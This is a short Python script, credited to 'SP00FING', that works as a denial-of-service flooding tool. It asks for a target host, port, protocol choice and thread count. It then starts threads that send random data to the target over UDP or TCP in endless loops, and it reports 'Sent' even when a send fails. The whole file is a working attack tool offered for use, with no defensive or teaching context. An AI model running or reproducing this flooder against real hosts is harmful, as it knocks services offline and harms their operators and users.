#!/usr/bin/env python3
import random
import socket
import threading

print("--> C0de By SP00FING <--")
print("#-- TCP/UDP FLOOD --#")
ip = str(input(" [+] Host/Ip : "))
port = int(input(" [+] Port : "))
choice = str(input(" [+] UDP ( y / n ) : "))
times = int(input(" [+] Packets Per One Connection : "))
threads = int(input(" [+] Threads : "))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print(i +" Sent!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Package Sent !")
		except:
			print(i +" Package Sent !")
			pass
			#s.close()
			#print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
